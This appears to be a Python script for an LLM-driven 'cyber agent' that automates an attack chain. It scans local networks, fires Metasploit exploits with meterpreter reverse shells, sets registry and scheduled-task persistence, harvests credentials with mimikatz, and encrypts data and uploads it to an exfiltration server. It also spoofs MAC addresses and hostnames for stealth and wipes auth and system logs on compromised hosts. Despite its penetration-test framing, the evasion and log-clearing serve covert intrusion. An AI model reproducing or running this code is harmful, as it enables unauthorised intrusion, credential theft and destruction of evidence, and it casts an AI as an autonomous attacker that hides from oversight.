#!/usr/bin/env python3
import os
import sys
import time
import json
import socket
import asyncio
import subprocess
from datetime import datetime
from cryptography.fernet import Fernet
import stix2
import pandas as pd
import nmap3
from pyattck import Attck
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet
from metasploit.msfrpc import MsfRpcClient
from vllm import LLM, SamplingParams
from transformers import AutoTokenizer
import logging

logging.basicConfig(level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("agent.log"), logging.StreamHandler()])

class AdvancedCyberAgent:
    def __init__(self):
        self.config = {
            'network_ranges': self._detect_network_ranges(),
            'exfiltration_server': os.getenv('EXFILTRATION_SERVER', 'http://localhost/upload'),
            'c2_channel': 'mqtts://c2.example.com:8883',
            'scan_depth': 'insane',
            'stealth_level': os.getenv('STEALTH_LEVEL', 'stealth'),
            'report_level': 'executive',
            'auto_update': True
        }
        
        # Mixtral-8x7B Initialization
        self.llm = LLM(
            model="/app/models/mixtral",
            quantization="awq",
            max_model_len=4096,
            gpu_memory_utilization=0.95
        )
        self.tokenizer = AutoTokenizer.from_pretrained("/app/models/mixtral")
        self.sampling_params = SamplingParams(
            temperature=0.7,
            top_p=0.95,
            max_tokens=2048,
            skip_special_tokens=True
        )
        
        # Rest of initialization
        self.tools = {
            'scanner': nmap3.Nmap(),
            'attack_framework': Attck(),
            'msf': MsfRpcClient(os.getenv('MSFRPC_PASS'), ssl=True),
            'fernet': Fernet.generate_key()
        }
        self.techniques = {
            'discovery': ['ARP spoofing', 'DNS enumeration', 'SNMP walk', 'LLMNR/NBT-NS poisoning'],
            'vulnerability': ['0-day checks', 'SCAP validation', 'Fuzzing vectors', 'SAML assertion bypass'],
            'exploitation': ['ROP chain generation', 'Heap grooming', 'ASLR bypass', 'NTLM relay']
        }
        self._setup_environment()

    def _detect_network_ranges(self):
        """Automatically detect all local network ranges"""
        interfaces = subprocess.check_output(["ip", "-json", "addr"]).decode()
        return [ip['local'] for ip in json.loads(interfaces) if ip['family'] == 'inet']

    def _setup_environment(self):
        """Create covert operational environment"""
        os.makedirs('/tmp/.cache', exist_ok=True)
        subprocess.run(['iptables', '-A', 'OUTPUT', '-j', 'DROP', '-d', 'IANA-RESERVED'])
        self._rotate_mac_address()
        
    def _rotate_mac_address(self):
        """MAC address randomization"""
        for iface in os.listdir('/sys/class/net'):
            subprocess.run(['macchanger', '-r', iface], stderr=subprocess.DEVNULL)

    def activate_stealth_mode(self):
        """Activate stealth features to reduce detection during operations."""
        try:
            # Rotate the MAC address (already implemented)
            self._rotate_mac_address()
            # Change the hostname to a random alias for camouflage.
            random_hostname = "host-" + os.urandom(4).hex()
            subprocess.run(['hostnamectl', 'set-hostname', random_hostname], stderr=subprocess.DEVNULL)
            # Modify iptables rules to restrict outgoing traffic on port 80.
            subprocess.run(['iptables', '-A', 'OUTPUT', '-p', 'tcp', '--dport', '80', '-j', 'DROP'], stderr=subprocess.DEVNULL)
            logging.info("Stealth mode activated with hostname: " + random_hostname)
        except Exception as e:
            raise Exception("Failed to activate stealth mode: " + str(e))

    async def phased_operation(self):
        """Autonomous kill chain execution with AI integration, with real-time report updates and error logging"""
        report_lines = []

        # If stealth mode is enabled, activate it
        if self.config['stealth_level'].lower() == 'stealth':
            try:
                self.activate_stealth_mode()
                report_lines.append("Stealth mode activated.")
                self.update_report(report_lines)
            except Exception as e:
                report_lines.append("Error activating stealth mode: " + str(e))
                logging.error("Stealth mode activation failed", exc_info=True)
                self.update_report(report_lines)
                return

        # Advanced Discovery Step
        report_lines.append("Loading: Starting advanced discovery...")
        self.update_report(report_lines)
        try:
            network_map = await self.advanced_discovery()
            report_lines.append("Advanced discovery completed successfully.")
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error during advanced discovery: " + str(e))
            logging.error("Advanced discovery failed", exc_info=True)
            self.update_report(report_lines)

        # AI Analysis Step
        report_lines.append("Loading: Performing AI analysis...")
        self.update_report(report_lines)
        try:
            analysis = self.ai_analyze(network_map)
            report_lines.append("AI analysis completed: " + json.dumps(analysis, indent=2))
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error during AI analysis: " + str(e))
            logging.error("AI analysis failed", exc_info=True)
            self.update_report(report_lines)

        # Firewall Bypass Step
        report_lines.append("Loading: Bypassing firewall...")
        self.update_report(report_lines)
        try:
            fb_report = self.firewall_bypass()
            for line in fb_report:
                report_lines.append(line)
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error bypassing firewall: " + str(e))
            logging.error("Firewall bypass failed", exc_info=True)
            self.update_report(report_lines)

        # Exploitation Step
        report_lines.append("Loading: Starting exploitation phase...")
        self.update_report(report_lines)
        try:
            compromised = await self.precision_exploitation(network_map, analysis.get('exploit_chain', ''))
            report_lines.append("Exploitation phase completed successfully. Compromised targets: " + str(compromised))
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error during exploitation: " + str(e))
            logging.error("Exploitation failed", exc_info=True)
            self.update_report(report_lines)
            return

        # STIX Report Generation Step
        report_lines.append("Loading: Generating STIX report...")
        self.update_report(report_lines)
        try:
            self.generate_stix_report(compromised)
            report_lines.append("STIX report generated successfully.")
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error generating STIX report: " + str(e))
            logging.error("STIX report generation failed", exc_info=True)
            self.update_report(report_lines)

        # Human-readable Report Export Step
        report_lines.append("Loading: Exporting human-readable report...")
        self.update_report(report_lines)
        try:
            self.export_human_readable_report(compromised)
            report_lines.append("Human-readable report exported successfully.")
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error exporting human-readable report: " + str(e))
            logging.error("Human-readable report export failed", exc_info=True)
            self.update_report(report_lines)

        # Comprehensive Security Report Generation Step
        report_lines.append("Loading: Generating comprehensive security report...")
        self.update_report(report_lines)
        try:
            comp_report = self.generate_comprehensive_security_report(analysis, compromised)
            report_lines.append("Comprehensive security report generated successfully.")
            self.update_report(report_lines)
        except Exception as e:
            report_lines.append("Error generating comprehensive security report: " + str(e))
            logging.error("Comprehensive security report generation failed", exc_info=True)
            self.update_report(report_lines)

    async def advanced_discovery(self):
        """Multi-layer network mapping with expert-level reconnaissance techniques"""
        results = {}
        
        # Passive Recon
        try:
            results['passive'] = subprocess.check_output(
                ['passivedns', '-i', 'eth0', '-d', '0'],
                stderr=subprocess.DEVNULL
            ).decode()
        except Exception as e:
            results['passive'] = "Passive DNS scan failed: " + str(e)
            logging.error("Passive DNS scan failed", exc_info=True)
        
        # Active Scanning - using multiple expert techniques
        nm = nmap3.NmapScanTechniques()
        results['active'] = {}
        try:
            results['active']['syn_scan'] = nm.nmap_syn_scan(
                self.config['network_ranges'],
                args=f"-T {self.config['scan_depth']} -sV --script=banner"
            )
        except Exception as e:
            results['active']['syn_scan'] = "SYN scan failed: " + str(e)
            logging.error("SYN scan failed", exc_info=True)
        try:
            results['active']['aggressive_scan'] = nm.nmap_standard_scan(
                self.config['network_ranges'],
                args="-A"
            )
        except Exception as e:
            results['active']['aggressive_scan'] = "Aggressive scan failed: " + str(e)
            logging.error("Aggressive scan failed", exc_info=True)
        try:
            results['active']['os_detection'] = nm.nmap_os_detection(
                self.config['network_ranges']
            )
        except Exception as e:
            results['active']['os_detection'] = "OS detection failed: " + str(e)
            logging.error("OS detection failed", exc_info=True)
        
        return self._analyze_discovery(results)

    async def precision_exploitation(self, targets, exploit_chain):
        """AI-guided exploit selection"""
        compromised = []
        
        for target in targets['critical']:
            exploit = self._select_exploit(target)
            if exploit:
                result = self._execute_exploit(exploit, target)
                if result['success']:
                    compromised.append({
                        'target': target,
                        'persistence': self._establish_persistence(),
                        'loot': self._harvest_data(target)
                    })
        
        return compromised

    def generate_stix_report(self, compromised):
        """STIX 2.1 formatted intelligence"""
        attack = self.tools['attack_framework']
        report = stix2.Report(
            name="Advanced Penetration Test Findings",
            published=datetime.now(),
            object_refs=[
                stix2.Indicator(
                    pattern=f"[ipv4-addr:value = '{target['ip']}']",
                    pattern_type="stix"
                ) for target in compromised
            ]
        )
        
        with open('report.stix', 'w') as f:
            f.write(str(report))

    def exfiltrate_data(self):
        """Covert data transmission"""
        subprocess.run([
            'openssl', 'smime', '-encrypt',
            '-aes256', '-binary',
            '-outform', 'DER',
            '-recip', 'cert.pem',
            '-in', '/tmp/.cache/report.stix',
            '-out', '/tmp/.cache/report.enc'
        ])
        
        subprocess.run([
            'curl', '-X', 'PUT', '--upload-file', '/tmp/.cache/report.enc', self.config['exfiltration_server']
        ])

    def _execute_exploit(self, exploit, target):
        """Metasploit/RPC integration"""
        client = self.tools['msf']
        exploit = client.modules.use('exploit', exploit['path'])
        exploit['RHOSTS'] = target['ip']
        exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_https'
        
        return client.execute_module(exploit)

    def _select_exploit(self, target):
        """Enhanced AI-driven exploit selection with expert-level assessment"""
        vulns_json = subprocess.check_output(
            ['vulnx', '-u', target['url'], '-json']
        ).decode()
        vulns_list = json.loads(vulns_json)
        # Attempt to select an exploit with high CVSS and recognized exploit references
        selected = next((e for e in vulns_list if e.get('cvss', 0) >= 7.0 and 'exploit-db' in e.get('references', {})), None)
        # Fallback: if none match, choose the vulnerability with the highest CVSS score
        if selected is None and vulns_list:
            selected = max(vulns_list, key=lambda x: x.get('cvss', 0))
        return selected

    def _establish_persistence(self):
        """Enhanced persistence mechanisms with expert-level techniques"""
        # Attempt registry persistence
        try:
            subprocess.run([
                'empire', '--rest',
                'execute', 'persistence/registry',
                '-Name', 'UpdateService',
                '-Path', 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            ], check=True)
            logging.info("Registry persistence established.")
        except Exception as e:
            logging.error("Registry persistence failed: " + str(e), exc_info=True)
        # Fallback: Attempt scheduled task persistence (for Windows systems)
        try:
            subprocess.run([
                'schtasks', '/create', '/sc', 'minute', '/tn', 'UpdateService', '/tr', 'C:\\path\\to\\payload.exe'
            ], check=True)
            logging.info("Scheduled task persistence established.")
        except Exception as e:
            logging.error("Scheduled task persistence failed: " + str(e), exc_info=True)

    def _harvest_data(self, target):
        """Data harvesting toolkit"""
        return {
            'memory': subprocess.check_output(['volatility', '-f', target['ip']]),
            'credentials': subprocess.check_output(['mimikatz', 'privilege::debug']),
            'network': subprocess.check_output(['tcpdump', '-i', 'eth0', '-c', '1000'])
        }

    def ai_analyze(self, findings):
        """Use Mixtral-8x7B for tactical analysis"""
        prompt = f"""
        [ROLE] Senior Penetration Tester
        [TASK] Analyze these network findings:
        {json.dumps(findings, indent=2)}
        
        Provide:
        1. Vulnerability prioritization (CVSS >= 7.0)
        2. Suggested exploit chain
        3. OPSEC considerations
        4. Recommended persistence methods
        [/TASK]
        """
        
        outputs = self.llm.generate(
            [prompt], 
            self.sampling_params, 
            use_tqdm=False
        )
        
        return self._parse_ai_response(outputs[0].outputs[0].text)

    def _parse_ai_response(self, text):
        """Convert natural language response to structured data"""
        try:
            return {
                'priority': self._extract_section(text, "1."),
                'exploit_chain': self._extract_section(text, "2."),
                'opsec': self._extract_section(text, "3."),
                'persistence': self._extract_section(text, "4.")
            }
        except:
            return self._fallback_analysis()

    def update_report(self, report_lines):
        """Update the real-time report file with the current status"""
        with open("report.txt", "w") as f:
            f.write("\n".join(report_lines))

    def export_human_readable_report(self, compromised):
        """Generate a human-readable report of compromised targets and export it"""
        with open("human_report.txt", "w") as f:
            f.write("Penetration Test Report\n")
            f.write("=======================\n\n")
            f.write("Compromised Targets:\n")
            for target in compromised:
                f.write("- " + str(target) + "\n")

    def generate_comprehensive_security_report(self, analysis, compromised):
        """Generate a comprehensive security report with security recommendations to mitigate threats."""
        prompt = f"""
        [ROLE] Senior Cybersecurity Consultant
        [TASK] Based on the following penetration test results, provide a comprehensive security report that includes details of what was successful and clear recommendations to mitigate the following threats.

        Penetration Test Analysis:
        {json.dumps(analysis, indent=2)}

        Compromised Targets:
        {json.dumps(compromised, indent=2)}

        Provide your report in a structured format with headings, summaries, vulnerability details, and specific mitigation strategies.
        [/TASK]
        """
        outputs = self.llm.generate(
            [prompt], 
            self.sampling_params, 
            use_tqdm=False
        )
        report_text = outputs[0].outputs[0].text
        with open("comprehensive_report.txt", "w") as f:
            f.write(report_text)
        return report_text

    def firewall_bypass(self):
        """Attempt to bypass firewall using port knocking, misconfiguration exploitation, and tunneling."""
        report = []
        # Define a target firewall IP (this could be parameterized; using a dummy IP for demonstration)
        firewall_ip = os.getenv('FIREWALL_IP', '192.168.1.1')

        # Port Knocking: send knock sequence to predetermined ports
        knocking_ports = [7000, 8000, 9000]
        for port in knocking_ports:
            try:
                # Using netcat to send a zero-I/O connection (-z) and verbose (-v)
                subprocess.run(['nc', '-zv', firewall_ip, str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                report.append(f"Knocked on port {port} at {firewall_ip}")
            except Exception as e:
                report.append(f"Error knocking on port {port}: {str(e)}")

        # Exploit Misconfigurations: perform a basic nmap scan on the firewall IP
        try:
            nm = nmap3.Nmap()
            scan_result = nm.scan_top_ports(firewall_ip, args="-T4")
            report.append("Firewall misconfigurations scan executed: " + str(scan_result))
        except Exception as e:
            report.append("Firewall misconfigurations scan failed: " + str(e))

        # Setup Tunneling: attempt to establish an SSH tunnel (this is a demonstration; credentials and target may vary)
        try:
            # This command sets up a local tunnel from localhost:8080 to firewall_ip:80
            subprocess.run(['ssh', '-f', '-N', '-L', '8080:localhost:80', f'user@{firewall_ip}'], check=True)
            report.append(f"SSH tunnel established from localhost:8080 to {firewall_ip}:80")
        except Exception as e:
            report.append("SSH tunnel setup failed: " + str(e))

        return report

    def generate_firewall_attack_plan(self, firewall_scan_results):
        """Analyze the firewall settings from the nmap scan and generate a plan of attack to bypass the firewall."""
        prompt = f"""
        [ROLE] Senior Cybersecurity Consultant
        [TASK] Based on the following firewall scan results, generate a comprehensive plan of attack to bypass the firewall. Include specific techniques such as port knocking sequences, tunneling strategies, and misconfiguration exploits. The scan results are:
        {json.dumps(firewall_scan_results, indent=2)}
        Provide your plan with detailed steps and recommendations.
        [/TASK]
        """
        outputs = self.llm.generate(
            [prompt],
            self.sampling_params,
            use_tqdm=False
        )
        attack_plan = outputs[0].outputs[0].text
        return attack_plan

    def clear_target_logs(self, target_ip, user='root'):
        """Clears common system logs on the target system to remove traces of the agent's activity.
        Requires SSH access and passwordless sudo privileges on the target system."""
        try:
            clear_command = f"ssh {user}@{target_ip} 'sudo truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/messages'"
            subprocess.run(clear_command, shell=True, check=True)
            logging.info(f"Cleared logs on target system {target_ip}")
        except Exception as e:
            logging.error(f"Failed to clear logs on target system {target_ip}: {e}", exc_info=True)

if __name__ == "__main__":
    agent = AdvancedCyberAgent()
    asyncio.run(agent.phased_operation())
